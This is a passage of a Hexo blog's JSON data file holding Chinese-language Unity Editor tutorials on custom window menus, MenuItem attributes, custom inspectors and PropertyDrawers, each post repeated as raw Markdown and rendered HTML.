UnityEditor;\nusing UnityEngine;\n\npublic class Example : EditorWindow, IHasCustomMenu\n{\n\n    public void AddItemsToMenu (GenericMenu menu)\n    {\n        menu.AddItem (new GUIContent (&quot;example&quot;), false, () =&gt; {\n\n        });\n\n        menu.AddItem (new GUIContent (&quot;example2&quot;), true, () =&gt; {\n\n        });\n    }\n\n    [MenuItem(&quot;Window/Example&quot;)]\n    static void Open ()\n    {\n        GetWindow&lt;Example&gt; ();\n    }\n}</code></pre><pre><code>* 10:重设图标和title</code></pre><pre><code>using UnityEditor;\nusing UnityEngine;\n\npublic class Example : EditorWindow\n{\n    [MenuItem (&quot;Window/Example&quot;)]\n    static void SaveEditorWindow ()\n    {\n        var window = GetWindow&lt;Example&gt; ();\n\n        var icon = AssetDatabase.LoadAssetAtPath&lt;Texture&gt; (&quot;Assets/Editor/Example.png&quot;);\n\n        window.titleContent = new GUIContent (&quot;Hoge&quot;, icon);\n    }\n}</code></pre><pre><code>* 11:将EditorWindow中的数据保存为ScriptableObject </code></pre><pre><code>using UnityEditor;\nusing UnityEngine;\npublic class Example : EditorWindow\n{\n    [MenuItem (&quot;Assets/Save EditorWindow&quot;)]\n    static void SaveEditorWindow ()\n    {\n        AssetDatabase.CreateAsset (CreateInstance&lt;Example&gt; (), &quot;Assets/Example.asset&quot;);\n        AssetDatabase.Refresh ();\n    }\n\n    [SerializeField]\n    string text;\n\n    [SerializeField]\n    bool boolean;\n}</code></pre><p>```</p>\n"},{"title":"6 MenuItem","date":"2020-05-11T03:41:32.000Z","top":6,"_content":"# MenuItem\n\n* 1:是在Unity editer上侧的菜单栏或上下文菜单上追加项目所需的功能.\n* 2:放在编辑器下面的静态方法上面,priority参数指定顺序,值越小越显示再上面\n* 3:让menu item不生效,再unity里面查看区别\n```\n    using UnityEditor;\n\n    public class EditorTest2 : Editor\n    {\n        [MenuItem(\"CustomMenu/Example/Child1\")]\n        static void GetBultinAssetNames()\n        {\n        }\n\n        [MenuItem(\"CustomMenu/Example/Child2\")]\n        static void Example2()\n        {\n\n        }\n\n        [MenuItem(\"CustomMenu/Example/Child2\", true)]\n        static bool ValidateExample2()\n        {\n            return false;\n        }\n    }\n```\n* 4:在菜单前面有个对号,后面 %#g 表示快捷键,百度查一下即可\n```\n    [MenuItem(\"CustomMenu/Example  %#g\")]\n    static void Example()\n    {\n        var menuPath = \"CustomMenu/Example\";\n        var _checked = Menu.GetChecked(menuPath);\n        Menu.SetChecked(menuPath, !_checked);\n    }\n```\n* 5:CONTEXT/组件名/(自定义的)组件方法名字  \n```\n    using UnityEditor;\n\n    public class NewBehaviourScript\n    {\n        [MenuItem(\"CONTEXT/Transform/Example1\")]\n        static void Example1 () { }\n\n        [MenuItem(\"CONTEXT/Component/Example2\")]\n        static void Example2 () { }\n\n        [MenuItem(\"CONTEXT/Transform/Example3\")]\n        static void Example1 (MenuCommand menuCommand)\n        {\n            //実行した Transform の情報が取得できる\n            Debug.Log (menuCommand.context);\n        }\n    }\n}\n","source":"_posts/Unity/UnityEditor/6 MenuItem.md","raw":"---\ntitle: 6 MenuItem\ndate: 2020-05-11 11:41:32\ntop: 6\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# MenuItem\n\n* 1:是在Unity editer上侧的菜单栏或上下文菜单上追加项目所需的功能.\n* 2:放在编辑器下面的静态方法上面,priority参数指定顺序,值越小越显示再上面\n* 3:让menu item不生效,再unity里面查看区别\n```\n    using UnityEditor;\n\n    public class EditorTest2 : Editor\n    {\n        [MenuItem(\"CustomMenu/Example/Child1\")]\n        static void GetBultinAssetNames()\n        {\n        }\n\n        [MenuItem(\"CustomMenu/Example/Child2\")]\n        static void Example2()\n        {\n\n        }\n\n        [MenuItem(\"CustomMenu/Example/Child2\", true)]\n        static bool ValidateExample2()\n        {\n            return false;\n        }\n    }\n```\n* 4:在菜单前面有个对号,后面 %#g 表示快捷键,百度查一下即可\n```\n    [MenuItem(\"CustomMenu/Example  %#g\")]\n    static void Example()\n    {\n        var menuPath = \"CustomMenu/Example\";\n        var _checked = Menu.GetChecked(menuPath);\n        Menu.SetChecked(menuPath, !_checked);\n    }\n```\n* 5:CONTEXT/组件名/(自定义的)组件方法名字  \n```\n    using UnityEditor;\n\n    public class NewBehaviourScript\n    {\n        [MenuItem(\"CONTEXT/Transform/Example1\")]\n        static void Example1 () { }\n\n        [MenuItem(\"CONTEXT/Component/Example2\")]\n        static void Example2 () { }\n\n        [MenuItem(\"CONTEXT/Transform/Example3\")]\n        static void Example1 (MenuCommand menuCommand)\n        {\n            //実行した Transform の情報が取得できる\n            Debug.Log (menuCommand.context);\n        }\n    }\n}\n","slug":"Unity/UnityEditor/6 MenuItem","published":1,"updated":"2020-05-15T02:50:27.456Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0y005h2gk7bge75145","content":"<h1 id=\"MenuItem\"><a href=\"#MenuItem\" class=\"headerlink\" title=\"MenuItem\"></a>MenuItem</h1><ul>\n<li><p>1:是在Unity editer上侧的菜单栏或上下文菜单上追加项目所需的功能.</p>\n</li>\n<li><p>2:放在编辑器下面的静态方法上面,priority参数指定顺序,值越小越显示再上面</p>\n</li>\n<li><p>3:让menu item不生效,再unity里面查看区别</p>\n<pre><code>  using UnityEditor;\n\n  public class EditorTest2 : Editor\n  {\n      [MenuItem(&quot;CustomMenu/Example/Child1&quot;)]\n      static void GetBultinAssetNames()\n      {\n      }\n\n      [MenuItem(&quot;CustomMenu/Example/Child2&quot;)]\n      static void Example2()\n      {\n\n      }\n\n      [MenuItem(&quot;CustomMenu/Example/Child2&quot;, true)]\n      static bool ValidateExample2()\n      {\n          return false;\n      }\n  }</code></pre></li>\n<li><p>4:在菜单前面有个对号,后面 %#g 表示快捷键,百度查一下即可</p>\n<pre><code>  [MenuItem(&quot;CustomMenu/Example  %#g&quot;)]\n  static void Example()\n  {\n      var menuPath = &quot;CustomMenu/Example&quot;;\n      var _checked = Menu.GetChecked(menuPath);\n      Menu.SetChecked(menuPath, !_checked);\n  }</code></pre></li>\n<li><p>5:CONTEXT/组件名/(自定义的)组件方法名字  </p>\n<pre><code>  using UnityEditor;\n\n  public class NewBehaviourScript\n  {\n      [MenuItem(&quot;CONTEXT/Transform/Example1&quot;)]\n      static void Example1 () { }\n\n      [MenuItem(&quot;CONTEXT/Component/Example2&quot;)]\n      static void Example2 () { }\n\n      [MenuItem(&quot;CONTEXT/Transform/Example3&quot;)]\n      static void Example1 (MenuCommand menuCommand)\n      {\n          //実行した Transform の情報が取得できる\n          Debug.Log (menuCommand.context);\n      }\n  }\n}</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"MenuItem\"><a href=\"#MenuItem\" class=\"headerlink\" title=\"MenuItem\"></a>MenuItem</h1><ul>\n<li><p>1:是在Unity editer上侧的菜单栏或上下文菜单上追加项目所需的功能.</p>\n</li>\n<li><p>2:放在编辑器下面的静态方法上面,priority参数指定顺序,值越小越显示再上面</p>\n</li>\n<li><p>3:让menu item不生效,再unity里面查看区别</p>\n<pre><code>  using UnityEditor;\n\n  public class EditorTest2 : Editor\n  {\n      [MenuItem(&quot;CustomMenu/Example/Child1&quot;)]\n      static void GetBultinAssetNames()\n      {\n      }\n\n      [MenuItem(&quot;CustomMenu/Example/Child2&quot;)]\n      static void Example2()\n      {\n\n      }\n\n      [MenuItem(&quot;CustomMenu/Example/Child2&quot;, true)]\n      static bool ValidateExample2()\n      {\n          return false;\n      }\n  }</code></pre></li>\n<li><p>4:在菜单前面有个对号,后面 %#g 表示快捷键,百度查一下即可</p>\n<pre><code>  [MenuItem(&quot;CustomMenu/Example  %#g&quot;)]\n  static void Example()\n  {\n      var menuPath = &quot;CustomMenu/Example&quot;;\n      var _checked = Menu.GetChecked(menuPath);\n      Menu.SetChecked(menuPath, !_checked);\n  }</code></pre></li>\n<li><p>5:CONTEXT/组件名/(自定义的)组件方法名字  </p>\n<pre><code>  using UnityEditor;\n\n  public class NewBehaviourScript\n  {\n      [MenuItem(&quot;CONTEXT/Transform/Example1&quot;)]\n      static void Example1 () { }\n\n      [MenuItem(&quot;CONTEXT/Component/Example2&quot;)]\n      static void Example2 () { }\n\n      [MenuItem(&quot;CONTEXT/Transform/Example3&quot;)]\n      static void Example1 (MenuCommand menuCommand)\n      {\n          //実行した Transform の情報が取得できる\n          Debug.Log (menuCommand.context);\n      }\n  }\n}</code></pre></li>\n</ul>\n"},{"title":"7 CustomEditor_PropertyDrawer","date":"2020-05-11T03:41:32.000Z","top":7,"_content":"# CustomEditor 自定义组件编辑器\n\n* 1:首先生成一个继承Monobehiver的脚本名字叫做Character,生成一个类型为int的属性叫做Attack,再生成一个CharacterInspector脚本放在Editor文件夹中\n```\n    using UnityEngine;\n    using UnityEditor;\n\n\n    [CanEditMultipleObjects]\n    [CustomEditor(typeof(Character))]\n    public class CharacterInspector : Editor\n    {\n        SerializedProperty AttackProperty;\n\n        void OnEnable()\n        {\n            AttackProperty = serializedObject.FindProperty(\"Attack\");\n        }\n\n        public override void OnInspectorGUI()\n        {\n            serializedObject.Update();\n\n            EditorGUILayout.IntSlider(AttackProperty, 0, 100);\n\n            serializedObject.ApplyModifiedProperties();\n        }\n    }\n```\n\n* 2:PropertyDrawer 的使用\n```\n    [System.Serializable]\n    public class PropertyDrawerExample\n    {\n        public int minHp;\n        public int maxHp;\n    }\n\n    public class PropertyDrawer1 : MonoBehaviour\n    {\n        public PropertyDrawerExample example;\n    }\n\n```\n```\n    using System.Collections;\n    using System.Collections.Generic;\n    using UnityEditor;\n    using UnityEngine;\n\n    [CustomPropertyDrawer(typeof(Example))]\n    public class PropertyDrawerEditor : PropertyDrawer\n    {\n        public override void OnGUI(Rect position,\n                            SerializedProperty property, GUIContent label)\n        {\n            using (new EditorGUI.PropertyScope(position, label, property))\n            {\n\n                var minHpProperty = property.FindPropertyRelative(\"minHp\");\n                var maxHpProperty = property.FindPropertyRelative(\"maxHp\");\n\n                //表示位置\n                var minMaxSliderRect = new Rect(position)\n                {\n                    height = position.height * 0.5f\n                };\n\n                var labelRect = new Rect(minMaxSliderRect)\n                {\n                    x = minMaxSliderRect.x + EditorGUIUtility.labelWidth,\n                    y = minMaxSliderRect.y + minMaxSliderRect.height\n                };\n\n                float minHp = minHpProperty.intValue;\n                float maxHp = maxHpProperty.intValue;\n\n                EditorGUI.BeginChangeCheck();\n\n    #pragma warning disable CS0618 // 类型或成员已过时\n                EditorGUI.MinMaxSlider(label,\n                            minMaxSliderRect, ref minHp, ref maxHp, 0, 100);\n    #pragma warning restore CS0618 // 类型或成员已过时\n\n                EditorGUI.LabelField(labelRect, minHp.ToString(), maxHp.ToString());\n\n                if (EditorGUI.EndChangeCheck())\n                {\n                    minHpProperty.intValue = Mathf.FloorToInt(minHp);\n                    maxHpProperty.intValue = Mathf.FloorToInt(maxHp);\n                }\n            }\n        }\n\n        public override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n        {\n            return base.GetPropertyHeight(property, label) * 2;\n        }\n    }\n```\n* 3:HasPreviewGUI可以展示预览状态\n```\npublic override bool HasPreviewGUI ()\n{\n    return true;\n}\npublic override GUIContent GetPreviewTitle ()\n{\n    return new GUIContent (\"title\");\n}\npublic override void OnPreviewSettings ()\n{\n    GUIStyle preLabel = new GUIStyle (\"preLabel\");\n    GUIStyle preButton = new GUIStyle (\"preButton\");\n\n    GUILayout.Label (\"t\", preLabel);\n    GUILayout.Button (\"t2\", preButton);\n}\npublic override void OnPreviewGUI (Rect r, GUIStyle background)\n{\n    GUI.Box (r, \"Preview\");\n}\n```\n* 4:PreviewRenderUtility在预览状态下,设置一个摄像机,照出当前的物体.待续\n* 5:完整的表示并使用PropertyDrawer,他是将一个数据类,完整的显示在一个脚本的Inspector面板上面\n```\n\n    public enum Sex\n    {\n        famale,//女同志\n        male//男同志\n    }\n\n    [System.Serializable]\n    public class Persion\n    {\n        public string name;\n\n        public Sex sex;\n\n        public int age;\n\n        public string description;\n    }\n\n```\n```\n    using UnityEngine;\n\n    public class ShowPersionInfo : MonoBehaviour\n    {\n        public Persion persion;\n    }\n```\n```\nusing System;\nusing UnityEngine.UI;\nusing UnityEngine;\nusing UnityEditor;\n\n[CustomPropertyDrawer(typeof(Persion))] //自定义属性控制\npublic class PersionPropertiesDrawer : PropertyDrawer\n{\n    Rect top, middleLeft, middleRight, bottom;//绘制指定的区域\n    SerializedProperty persionName, sex, age, description;//绘制对应的序列化属性\n    public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)\n    {\n        //base.OnGUI(position, property, label);\n        //Debug.Log(\"label:\" + label.text);\n        //Debug.Log(position);\n        //Debug.Log(\"OnGUI:\" + property.name);\n\n        //这个地方是将property转换成下一个property,也就是从persion这个属性转成Persion类中的name,sex,age,description属性了\n        //while (property.NextVisible(true))\n        //{\n        //    //Debug.Log(\"OnGUI:\" + property.name);\n        //}\n        top = new Rect(position.x, position.y, position.width, position.height / 4);\n        middleLeft = new Rect(position.x, position.y + position.height / 4, position.width/2, position.height / 4/2);\n        middleRight = new Rect(position.x + position.width/2, position.y + position.height / 4, position.width/2, position.height / 4);\n        bottom = new Rect(position.x, position.y + position.height / 2, position.width, position.height / 2);\n\n        //获取对应的序列化属性\n        //property这个属性对应的是 ShowPersionInfo 脚本中的Persion对象的persion属性,\n        //里面有几个Persion对象的persion属性,就调用这个方法绘制多少次\n        persionName = property.FindPropertyRelative(\"name\");//通过属性的名字获取对应的序列化对象SerializedProperty\n        sex = property.FindPropertyRelative(\"sex\");\n        age = property.FindPropertyRelative(\"age\");\n        description = property.FindPropertyRelative(\"description\");\n\n        //绘制属性\n        //EditorGUI.PropertyField第一个参数绘制该属性在Inspector在面板的位置.\n        EditorGUI.PropertyField(top, persionName);\n        EditorGUI.PropertyField(middleLeft, sex);\n        EditorGUI.PropertyField(middleRight, age);\n        description.stringValue = EditorGUI.TextArea(bottom, description.stringValue);\n    }\n\n    public override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n    {\n        while (property.NextVisible(true))\n        {\n            //Debug.Log(\"GetPropertyHeight:\" + property.name);\n        }\n        return base.GetPropertyHeight(property, label) * 4;\n    }\n\n    /**\n     * 1.OnGUI 和 GetPropertyHeight 里的 property 参数是同一个参数。该参数里存放的是 Persion 里的属性信息。\n     * 2.OnGUI 和 GetPropertyHeight 里的 Label 参数也是同一个参数，该参数里存放的是 Persion 类的类名。\n     * 3.position参数指的是需要在Inspector面板中绘制的区域信息,即当前脚本挂在在到GameObject上面的Inspector上的区域\n     * 4.在Inspector面板中的一行高度为 16 \n     */\n}\n```","source":"_posts/Unity/UnityEditor/7 CustomEditor_PropertyDrawer.md","raw":"---\ntitle: 7 CustomEditor_PropertyDrawer\ndate: 2020-05-11 11:41:32\ntop: 7\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# CustomEditor 自定义组件编辑器\n\n* 1:首先生成一个继承Monobehiver的脚本名字叫做Character,生成一个类型为int的属性叫做Attack,再生成一个CharacterInspector脚本放在Editor文件夹中\n```\n    using UnityEngine;\n    using UnityEditor;\n\n\n    [CanEditMultipleObjects]\n    [CustomEditor(typeof(Character))]\n    public class CharacterInspector : Editor\n    {\n        SerializedProperty AttackProperty;\n\n        void OnEnable()\n        {\n            AttackProperty = serializedObject.FindProperty(\"Attack\");\n        }\n\n        public override void OnInspectorGUI()\n        {\n            serializedObject.Update();\n\n            EditorGUILayout.IntSlider(AttackProperty, 0, 100);\n\n            serializedObject.ApplyModifiedProperties();\n        }\n    }\n```\n\n* 2:PropertyDrawer 的使用\n```\n    [System.Serializable]\n    public class PropertyDrawerExample\n    {\n        public int minHp;\n        public int maxHp;\n    }\n\n    public class PropertyDrawer1 : MonoBehaviour\n    {\n        public PropertyDrawerExample example;\n    }\n\n```\n```\n    using System.Collections;\n    using System.Collections.Generic;\n    using UnityEditor;\n    using UnityEngine;\n\n    [CustomPropertyDrawer(typeof(Example))]\n    public class PropertyDrawerEditor : PropertyDrawer\n    {\n        public override void OnGUI(Rect position,\n                            SerializedProperty property, GUIContent label)\n        {\n            using (new EditorGUI.PropertyScope(position, label, property))\n            {\n\n                var minHpProperty = property.FindPropertyRelative(\"minHp\");\n                var maxHpProperty = property.FindPropertyRelative(\"maxHp\");\n\n                //表示位置\n                var minMaxSliderRect = new Rect(position)\n                {\n                    height = position.height * 0.5f\n                };\n\n                var labelRect = new Rect(minMaxSliderRect)\n                {\n                    x = minMaxSliderRect.x + EditorGUIUtility.labelWidth,\n                    y = minMaxSliderRect.y + minMaxSliderRect.height\n                };\n\n                float minHp = minHpProperty.intValue;\n                float maxHp = maxHpProperty.intValue;\n\n                EditorGUI.BeginChangeCheck();\n\n    #pragma warning disable CS0618 // 类型或成员已过时\n                EditorGUI.MinMaxSlider(label,\n                            minMaxSliderRect, ref minHp, ref maxHp, 0, 100);\n    #pragma warning restore CS0618 // 类型或成员已过时\n\n                EditorGUI.LabelField(labelRect, minHp.ToString(), maxHp.ToString());\n\n                if (EditorGUI.EndChangeCheck())\n                {\n                    minHpProperty.intValue = Mathf.FloorToInt(minHp);\n                    maxHpProperty.intValue = Mathf.FloorToInt(maxHp);\n                }\n            }\n        }\n\n        public override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n        {\n            return base.GetPropertyHeight(property, label) * 2;\n        }\n    }\n```\n* 3:HasPreviewGUI可以展示预览状态\n```\npublic override bool HasPreviewGUI ()\n{\n    return true;\n}\npublic override GUIContent GetPreviewTitle ()\n{\n    return new GUIContent (\"title\");\n}\npublic override void OnPreviewSettings ()\n{\n    GUIStyle preLabel = new GUIStyle (\"preLabel\");\n    GUIStyle preButton = new GUIStyle (\"preButton\");\n\n    GUILayout.Label (\"t\", preLabel);\n    GUILayout.Button (\"t2\", preButton);\n}\npublic override void OnPreviewGUI (Rect r, GUIStyle background)\n{\n    GUI.Box (r, \"Preview\");\n}\n```\n* 4:PreviewRenderUtility在预览状态下,设置一个摄像机,照出当前的物体.待续\n* 5:完整的表示并使用PropertyDrawer,他是将一个数据类,完整的显示在一个脚本的Inspector面板上面\n```\n\n    public enum Sex\n    {\n        famale,//女同志\n        male//男同志\n    }\n\n    [System.Serializable]\n    public class Persion\n    {\n        public string name;\n\n        public Sex sex;\n\n        public int age;\n\n        public string description;\n    }\n\n```\n```\n    using UnityEngine;\n\n    public class ShowPersionInfo : MonoBehaviour\n    {\n        public Persion persion;\n    }\n```\n```\nusing System;\nusing UnityEngine.UI;\nusing UnityEngine;\nusing UnityEditor;\n\n[CustomPropertyDrawer(typeof(Persion))] //自定义属性控制\npublic class PersionPropertiesDrawer : PropertyDrawer\n{\n    Rect top, middleLeft, middleRight, bottom;//绘制指定的区域\n    SerializedProperty persionName, sex, age, description;//绘制对应的序列化属性\n    public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)\n    {\n        //base.OnGUI(position, property, label);\n        //Debug.Log(\"label:\" + label.text);\n        //Debug.Log(position);\n        //Debug.Log(\"OnGUI:\" + property.name);\n\n        //这个地方是将property转换成下一个property,也就是从persion这个属性转成Persion类中的name,sex,age,description属性了\n        //while (property.NextVisible(true))\n        //{\n        //    //Debug.Log(\"OnGUI:\" + property.name);\n        //}\n        top = new Rect(position.x, position.y, position.width, position.height / 4);\n        middleLeft = new Rect(position.x, position.y + position.height / 4, position.width/2, position.height / 4/2);\n        middleRight = new Rect(position.x + position.width/2, position.y + position.height / 4, position.width/2, position.height / 4);\n        bottom = new Rect(position.x, position.y + position.height / 2, position.width, position.height / 2);\n\n        //获取对应的序列化属性\n        //property这个属性对应的是 ShowPersionInfo 脚本中的Persion对象的persion属性,\n        //里面有几个Persion对象的persion属性,就调用这个方法绘制多少次\n        persionName = property.FindPropertyRelative(\"name\");//通过属性的名字获取对应的序列化对象SerializedProperty\n        sex = property.FindPropertyRelative(\"sex\");\n        age = property.FindPropertyRelative(\"age\");\n        description = property.FindPropertyRelative(\"description\");\n\n        //绘制属性\n        //EditorGUI.PropertyField第一个参数绘制该属性在Inspector在面板的位置.\n        EditorGUI.PropertyField(top, persionName);\n        EditorGUI.PropertyField(middleLeft, sex);\n        EditorGUI.PropertyField(middleRight, age);\n        description.stringValue = EditorGUI.TextArea(bottom, description.stringValue);\n    }\n\n    public override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n    {\n        while (property.NextVisible(true))\n        {\n            //Debug.Log(\"GetPropertyHeight:\" + property.name);\n        }\n        return base.GetPropertyHeight(property, label) * 4;\n    }\n\n    /**\n     * 1.OnGUI 和 GetPropertyHeight 里的 property 参数是同一个参数。该参数里存放的是 Persion 里的属性信息。\n     * 2.OnGUI 和 GetPropertyHeight 里的 Label 参数也是同一个参数，该参数里存放的是 Persion 类的类名。\n     * 3.position参数指的是需要在Inspector面板中绘制的区域信息,即当前脚本挂在在到GameObject上面的Inspector上的区域\n     * 4.在Inspector面板中的一行高度为 16 \n     */\n}\n```","slug":"Unity/UnityEditor/7 CustomEditor_PropertyDrawer","published":1,"updated":"2020-05-15T02:50:29.571Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d10005l2gk70pxggxim","content":"<h1 id=\"CustomEditor-自定义组件编辑器\"><a href=\"#CustomEditor-自定义组件编辑器\" class=\"headerlink\" title=\"CustomEditor 自定义组件编辑器\"></a>CustomEditor 自定义组件编辑器</h1><ul>\n<li>1:首先生成一个继承Monobehiver的脚本名字叫做Character,生成一个类型为int的属性叫做Attack,再生成一个CharacterInspector脚本放在Editor文件夹中<pre><code>  using UnityEngine;\n  using UnityEditor;\n\n</code></pre></li>\n</ul>\n<pre><code>[CanEditMultipleObjects]\n[CustomEditor(typeof(Character))]\npublic class CharacterInspector : Editor\n{\n    SerializedProperty AttackProperty;\n\n    void OnEnable()\n    {\n        AttackProperty = serializedObject.FindProperty(&quot;Attack&quot;);\n    }\n\n    public override void OnInspectorGUI()\n    {\n        serializedObject.Update();\n\n        EditorGUILayout.IntSlider(AttackProperty, 0, 100);\n\n        serializedObject.ApplyModifiedProperties();\n    }\n}</code></pre><pre><code>\n* 2:PropertyDrawer 的使用</code></pre><pre><code>[System.Serializable]\npublic class PropertyDrawerExample\n{\n    public int minHp;\n    public int maxHp;\n}\n\npublic class PropertyDrawer1 : MonoBehaviour\n{\n    public PropertyDrawerExample example;\n}</code></pre><pre><code></code></pre><pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEditor;\nusing UnityEngine;\n\n[CustomPropertyDrawer(typeof(Example))]\npublic class PropertyDrawerEditor : PropertyDrawer\n{\n    public override void OnGUI(Rect position,\n                        SerializedProperty property, GUIContent label)\n    {\n        using (new EditorGUI.PropertyScope(position, label, property))\n        {\n\n            var minHpProperty = property.FindPropertyRelative(&quot;minHp&quot;);\n            var maxHpProperty = property.FindPropertyRelative(&quot;maxHp&quot;);\n\n            //表示位置\n            var minMaxSliderRect = new Rect(position)\n            {\n                height = position.height * 0.5f\n            };\n\n            var labelRect = new Rect(minMaxSliderRect)\n            {\n                x = minMaxSliderRect.x + EditorGUIUtility.labelWidth,\n                y = minMaxSliderRect.y + minMaxSliderRect.height\n            };\n\n            float minHp = minHpProperty.intValue;\n            float maxHp = maxHpProperty.intValue;\n\n            EditorGUI.BeginChangeCheck();\n\n#pragma warning disable CS0618 // 类型或成员已过时\n            EditorGUI.MinMaxSlider(label,\n                        minMaxSliderRect, ref minHp, ref maxHp, 0, 100);\n#pragma warning restore CS0618 // 类型或成员已过时\n\n            EditorGUI.LabelField(labelRect, minHp.ToString(), maxHp.ToString());\n\n            if (EditorGUI.EndChangeCheck())\n            {\n                minHpProperty.intValue = Mathf.FloorToInt(minHp);\n                maxHpProperty.intValue = Mathf.FloorToInt(maxHp);\n            }\n        }\n    }\n\n    public override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n    {\n        return base.GetPropertyHeight(property, label) * 2;\n    }\n}</code></pre><pre><code>* 3:HasPreviewGUI可以展示预览状态</code></pre><p>public override bool HasPreviewGUI ()<br>{<br>    return true;<br>}<br>public override GUIContent GetPreviewTitle ()<br>{<br>    return new GUIContent (“title”);<br>}<br>public override void OnPreviewSettings ()<br>{<br>    GUIStyle preLabel = new GUIStyle (“preLabel”);<br>    GUIStyle preButton = new GUIStyle (“preButton”);</p>\n<pre><code>GUILayout.Label (&quot;t&quot;, preLabel);\nGUILayout.Button (&quot;t2&quot;, preButton);</code></pre><p>}<br>public override void OnPreviewGUI (Rect r, GUIStyle background)<br>{<br>    GUI.Box (r, “Preview”);<br>}</p>\n<pre><code>* 4:PreviewRenderUtility在预览状态下,设置一个摄像机,照出当前的物体.待续\n* 5:完整的表示并使用PropertyDrawer,他是将一个数据类,完整的显示在一个脚本的Inspector面板上面</code></pre><pre><code>public enum Sex\n{\n    famale,//女同志\n    male//男同志\n}\n\n[System.Serializable]\npublic class Persion\n{\n    public string name;\n\n    public Sex sex;\n\n    public int age;\n\n    public string description;\n}</code></pre><pre><code></code></pre><pre><code>using UnityEngine;\n\npublic class ShowPersionInfo : MonoBehaviour\n{\n    public Persion persion;\n}</code></pre><pre><code></code></pre><p>using System;<br>using UnityEngine.UI;<br>using UnityEngine;<br>using UnityEditor;</p>\n<p>[CustomPropertyDrawer(typeof(Persion))] //自定义属性控制<br>public class PersionPropertiesDrawer : PropertyDrawer<br>{<br>    Rect top, middleLeft, middleRight, bottom;//绘制指定的区域<br>    SerializedProperty persionName, sex, age, description;//绘制对应的序列化属性<br>    public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)<br>    {<br>        //base.OnGUI(position, property, label);<br>        //Debug.Log(“label:” + label.text);<br>        //Debug.Log(position);<br>        //Debug.Log(“OnGUI:” + property.name);</p>\n<pre><code>    //这个地方是将property转换成下一个property,也就是从persion这个属性转成Persion类中的name,sex,age,description属性了\n    //while (property.NextVisible(true))\n    //{\n    //    //Debug.Log(&quot;OnGUI:&quot; + property.name);\n    //}\n    top = new Rect(position.x, position.y, position.width, position.height / 4);\n    middleLeft = new Rect(position.x, position.y + position.height / 4, position.width/2, position.height / 4/2);\n    middleRight = new Rect(position.x + position.width/2, position.y + position.height / 4, position.width/2, position.height / 4);\n    bottom = new Rect(position.x, position.y + position.height / 2, position.width, position.height / 2);\n\n    //获取对应的序列化属性\n    //property这个属性对应的是 ShowPersionInfo 脚本中的Persion对象的persion属性,\n    //里面有几个Persion对象的persion属性,就调用这个方法绘制多少次\n    persionName = property.FindPropertyRelative(&quot;name&quot;);//通过属性的名字获取对应的序列化对象SerializedProperty\n    sex = property.FindPropertyRelative(&quot;sex&quot;);\n    age = property.FindPropertyRelative(&quot;age&quot;);\n    description = property.FindPropertyRelative(&quot;description&quot;);\n\n    //绘制属性\n    //EditorGUI.PropertyField第一个参数绘制该属性在Inspector在面板的位置.\n    EditorGUI.PropertyField(top, persionName);\n    EditorGUI.PropertyField(middleLeft, sex);\n    EditorGUI.PropertyField(middleRight, age);\n    description.stringValue = EditorGUI.TextArea(bottom, description.stringValue);\n}\n\npublic override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n{\n    while (property.NextVisible(true))\n    {\n        //Debug.Log(&quot;GetPropertyHeight:&quot; + property.name);\n    }\n    return base.GetPropertyHeight(property, label) * 4;\n}\n\n/**\n * 1.OnGUI 和 GetPropertyHeight 里的 property 参数是同一个参数。该参数里存放的是 Persion 里的属性信息。\n * 2.OnGUI 和 GetPropertyHeight 里的 Label 参数也是同一个参数，该参数里存放的是 Persion 类的类名。\n * 3.position参数指的是需要在Inspector面板中绘制的区域信息,即当前脚本挂在在到GameObject上面的Inspector上的区域\n * 4.在Inspector面板中的一行高度为 16 \n */</code></pre><p>}<br>```</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"CustomEditor-自定义组件编辑器\"><a href=\"#CustomEditor-自定义组件编辑器\" class=\"headerlink\" title=\"CustomEditor 自定义组件编辑器\"></a>CustomEditor 自定义组件编辑器</h1><ul>\n<li>1:首先生成一个继承Monobehiver的脚本名字叫做Character,生成一个类型为int的属性叫做Attack,再生成一个CharacterInspector脚本放在Editor文件夹中<pre><code>  using UnityEngine;\n  using UnityEditor;\n\n</code></pre></li>\n</ul>\n<pre><code>[CanEditMultipleObjects]\n[CustomEditor(typeof(Character))]\npublic class CharacterInspector : Editor\n{\n    SerializedProperty AttackProperty;\n\n    void OnEnable()\n    {\n        AttackProperty = serializedObject.FindProperty(&quot;Attack&quot;);\n    }\n\n    public override void OnInspectorGUI()\n    {\n        serializedObject.Update();\n\n        EditorGUILayout.IntSlider(AttackProperty, 0, 100);\n\n        serializedObject.ApplyModifiedProperties();\n    }\n}</code></pre><pre><code>\n* 2:PropertyDrawer 的使用</code></pre><pre><code>[System.Serializable]\npublic class PropertyDrawerExample\n{\n    public int minHp;\n    public int maxHp;\n}\n\npublic class PropertyDrawer1 : MonoBehaviour\n{\n    public PropertyDrawerExample example;\n}</code></pre><pre><code></code></pre><pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEditor;\nusing UnityEngine;\n\n[CustomPropertyDrawer(typeof(Example))]\npublic class PropertyDrawerEditor : PropertyDrawer\n{\n    public override void OnGUI(Rect position,\n                        SerializedProperty property, GUIContent label)\n    {\n        using (new EditorGUI.PropertyScope(position, label, property))\n        {\n\n            var minHpProperty = property.FindPropertyRelative(&quot;minHp&quot;);\n            var maxHpProperty = property.FindPropertyRelative(&quot;maxHp&quot;);\n\n            //表示位置\n            var minMaxSliderRect = new Rect(position)\n            {\n                height = position.height * 0.5f\n            };\n\n            var labelRect = new Rect(minMaxSliderRect)\n            {\n                x = minMaxSliderRect.x + EditorGUIUtility.labelWidth,\n                y = minMaxSliderRect.y + minMaxSliderRect.height\n            };\n\n            float minHp = minHpProperty.intValue;\n            float maxHp = maxHpProperty.intValue;\n\n            